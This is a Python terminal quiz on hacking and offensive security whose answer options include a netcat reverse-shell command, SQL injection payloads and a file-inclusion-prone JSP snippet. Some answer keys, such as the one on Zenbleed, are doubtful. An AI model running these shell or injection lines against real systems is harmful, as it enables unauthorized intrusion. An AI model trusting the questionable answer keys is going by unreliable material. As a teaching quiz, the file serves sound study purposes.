# Import required modules
from os import system, name
from time import sleep


def clear():  # Function to clear screen for new question
    if name == 'nt':
        _ = system('cls')  # Clear Screen for Windows computers
    else:
        _ = system('clear')  # Clear Screen for Unix systems


# Set variables to track score and questions
score: int = 0
question: int = 0

clear()  # Reset the screen before questions

question += 1  # Count the number of questions, used later to calculate score and adjust for added questions
while 1 == 1:  # Always true loop so that when it catches an error, it will return back and ask the question again
    print("What is an SQL Server?")  # Question
    print(f"{'1) Database Server' : <20}{'2) HTTP Server' : >20}")  # Fstring for formatting, possible answers
    print(f"{'3) SSH Server' : <20}{'4) FTP Server' : >20}")
    answer = int(input("Your selection: "))  # Ask user for an answer 1-4, makes sure it's an integer
    if answer == 1:
        print("Correct")  # If answer is correct, print correct
        score += 1  # Add 1 to the score variable
        sleep(1)  # Wait before moving on
        break  # Exit loop to go to next question
    elif answer == 2 or answer == 3 or answer == 4:  # Check if answer is incorrect
        print("Incorrect")  # Print if incorrect
        sleep(1)  # Wait before moving on
        break  # Exit loop to go to next question
    else:  # Anything that doesn't match a valid response is caught (Anything that isn't 1, 2, 3, or 4)
        print("Please provide a valid answer")  # Tell them to provide a valid answer
        sleep(1)  # Wait before retrying
        clear()  # Remove error message and return to same question

clear()  # Clear screen to prep for next question

# The rest of the questions are basically copy and paste, feels redundant to comment the rest of them as they all work the same
question += 1
while 1 == 1:
    print("What is the correct syntax of an SQL query?")
    print(f"{'1) SELECT * FROM Users:' : <30}{'2) SELECT all FROM Users;' : >30}")
    print(f"{'3) SELECT * FROM Users;' : <30}{'4) SELECT all Users:' : >30}")
    answer = int(input("Your selection: "))
    if answer == 3:
        print("Correct")
        score += 1
        sleep(1)
        break
    elif answer == 1 or answer == 2 or answer == 4:
        print("Incorrect")
        sleep(1)
        break
    else:
        print("Please provide a valid answer")
        clear()

clear()

question += 1
while 1 == 1:
    print("Which SQL Injection statement would return the number of columns in a table?")
    print(f"{'1) UNION SELECT col1, col2 from table_name limit 1 -- -' : <50}{'2) ,(select * from (select(sleep(10)))a)' : >50}")
    print(f"{'3) UNION SELECT NULL,NULL,NULL -- - ' : <50}{'4) All of the above' : >35}")
    answer = int(input("Your selection: "))
    if answer == 3:
        print("Correct")
        score += 1
        sleep(1)
        break
    elif answer == 1 or answer == 2 or answer == 4:
        print("Incorrect")
        sleep(1)
        break
    else:
        print("Please provide a valid answer")
        clear()

clear()

question += 1
while 1 == 1:
    print("What language is the C2 Program \"Sliver\" written in?")
    print(f"{'1) Javascript' : <20}{'2) C' : >20}")
    print(f"{'3) Python' : <20}{'4) Go' : >20}")
    answer = int(input("Your selection: "))
    if answer == 4:
        print("Correct")
        score += 1
        sleep(1)
        break
    elif answer == 1 or answer == 2 or answer == 3:
        print("Incorrect")
        sleep(1)
        break
    else:
        print("Please provide a valid answer")
        clear()

clear()

question += 1
while 1 == 1:
    print("Which of these tools is used for creating malicious Microsoft Office files?")
    print(f"{'1) EvilClippy' : <20}{'2) Mystikal' : >20}")
    print(f"{'3) SharpSploit' : <20}{'4) DueDLLigence' : >20}")
    answer = int(input("Your selection: "))
    if answer == 1:
        print("Correct")
        score += 1
        sleep(1)
        break
    elif answer == 2 or answer == 3 or answer == 4:
        print("Incorrect")
        sleep(1)
        break
    else:
        print("Please provide a valid answer")
        clear()

clear()

question += 1
while 1 == 1:
    print("What is the famous bootkit that stores itself in UEFI?")
    print(f"{'1) Stuxnet' : <20}{'2) MoonBounce' : >20}")
    print(f"{'3) NTRootKit' : <20}{'4) ZeroAccess' : >20}")
    answer = int(input("Your selection: "))
    if answer == 2:
        print("Correct")
        score += 1
        sleep(1)
        break
    elif answer == 1 or answer == 3 or answer == 4:
        print("Incorrect")
        sleep(1)
        break
    else:
        print("Please provide a valid answer")
        clear()

clear()

question += 1
while 1 == 1:
    print("Which type of hacker is considered a \"Vigilante\" hacker?")
    print(f"{'1) Red Hat' : <20}{'2) White Hat' : >20}")
    print(f"{'3) Black Hat' : <20}{'4) Green Hat' : >20}")
    answer = int(input("Your selection: "))
    if answer == 1:
        print("Correct")
        score += 1
        sleep(1)
        break
    elif answer == 2 or answer == 3 or answer == 4:
        print("Incorrect")
        sleep(1)
        break
    else:
        print("Please provide a valid answer")
        clear()

clear()

question += 1
while 1 == 1:
    print("Which one of the following statements would connect back to a netcat reverse listener on a Linux host?")
    print(f"{'1) nc 192.168.100.113 4444 –e /bin/bash' : <40}{'2) nc -p 4444 192.168.100.113 -e /etc/hosts' : >40}")
    print(f"{'3) nc –lvp 4444' : <40}{'4) nc.exe 192.168.100.113 4444 –e cmd.exe' : >40}")
    answer = int(input("Your selection: "))
    if answer == 1:
        print("Correct")
        score += 1
        sleep(1)
        break
    elif answer == 2 or answer == 3 or answer == 4:
        print("Incorrect")
        sleep(1)
        break
    else:
        print("Please provide a valid answer")
        clear()

clear()

question += 1
while 1 == 1:
    print("If the following code <jsp:include page=”<%=(String)request.getParmeter(“ParamName”)%>”> was found on a webside, what would it be vulnerable to?")
    print(f"{'1) Command Execution' : <20}{'2) Local File Inclusion' : >20}")
    print(f"{'3) SQL Injection' : <20}{'4) Remote File Inclusion' : >20}")
    answer = int(input("Your selection: "))
    if answer == 4:
        print("Correct")
        score += 1
        sleep(1)
        break
    elif answer == 1 or answer == 2 or answer == 3:
        print("Incorrect")
        sleep(1)
        break
    else:
        print("Please provide a valid answer")
        clear()

clear()

question += 1
while 1 == 1:
    print("What is the term for a payload sent by a C2 server to an infected machine to install a rootkit?")
    print(f"{'1) Dropper' : <20}{'2) Loader' : >20}")
    print(f"{'3) Installer' : <20}{'4) Packet' : >20}")
    answer = int(input("Your selection: "))
    if answer == 2:
        print("Correct")
        score += 1
        sleep(1)
        break
    elif answer == 1 or answer == 3 or answer == 4:
        print("Incorrect")
        sleep(1)
        break
    else:
        print("Please provide a valid answer")
        clear()

clear()

question += 1
while 1 == 1:
    print("What vulnerability do rootkits often exploit to store the malicious code outside of normal bounds?")
    print(f"{'1) Buffer Overflow' : <20}{'2) Overwrite Error' : >20}")
    print(f"{'3) Command Execution' : <20}{'4) Stack Overflow' : >20}")
    answer = int(input("Your selection: "))
    if answer == 1:
        print("Correct")
        score += 1
        sleep(1)
        break
    elif answer == 2 or answer == 3 or answer == 4:
        print("Incorrect")
        sleep(1)
        break
    else:
        print("Please provide a valid answer")
        clear()

clear()

question += 1
while 1 == 1:
    print("What is the CVE describing a buffer overflow vulnerability in Python 3.X - 3.9.1?")
    print(f"{'1) CVE-2019-4762' : <20}{'2) CVE-2021-3177' : >20}")
    print(f"{'3) CVE-2022-4825' : <20}{'4) CVE-2021-5437' : >20}")
    answer = int(input("Your selection: "))
    if answer == 2:
        print("Correct")
        score += 1
        sleep(1)
        break
    elif answer == 1 or answer == 3 or answer == 4:
        print("Incorrect")
        sleep(1)
        break
    else:
        print("Please provide a valid answer")
        clear()

clear()

question += 1
while 1 == 1:
    print("What information could be gained by exploiting the \"Zenbleed\" vulnerability?")
    print(f"{'1) Device Information' : <20}{'2) Ip Addresses' : >20}")
    print(f"{'3) Files' : <20}{'4) User Logins' : >20}")
    answer = int(input("Your selection: "))
    if answer == 4:
        print("Correct")
        score += 1
        sleep(1)
        break
    elif answer == 2 or answer == 3 or answer == 1:
        print("Incorrect")
        sleep(1)
        break
    else:
        print("Please provide a valid answer")
        clear()

clear()

percentage = score / question * 100  # Divide score by number of questions, multiply by 100 to get percentage
if percentage >= 1:
    print("Congrats you got", score, "/", question, " (", percentage, "%)")  # Tell user the score and percentage
else:
    print("Yikes you got", score, "/", question, " (", percentage, "%)")
    print("Better luck next time")

# Show different messages based on percent
if percentage >= 90:
    print("You are a cybersecurity god")
elif percentage >= 80:
    print("You are a cybersecurity expert")
elif percentage >= 70:
    print("You are a cybersecurity pro")
elif percentage >= 60:
    print("You are a cybersecurity novice")
elif percentage >= 50:
    print("You are a cybersecurity apprentice")
elif percentage >= 40:
    print("You are a cybersecurity beginner")
else:
    print("Did you even try?")  # I had to, I'm sorry
